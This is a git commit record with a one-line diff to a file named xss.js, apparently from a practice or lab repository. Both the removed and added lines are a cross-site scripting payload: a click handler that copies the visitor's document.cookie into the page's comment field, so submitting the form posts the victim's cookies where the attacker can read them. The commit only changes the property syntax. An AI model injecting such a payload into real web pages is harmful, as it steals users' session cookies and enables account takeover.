5d55d10edf6e0437497582e8700aaa2497f2c10a
Pola Mikhail <pola.alper@gmail.com>
2021-02-26 10:22:15 +0000

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-document.forms[0]['submit'].addEventListener('click', function(){ document.forms[0]['comment'].value = document.cookie;}, false);
+document.forms[0].submit.addEventListener('click', function(){ document.forms[0]['comment'].value = document.cookie;}, false);
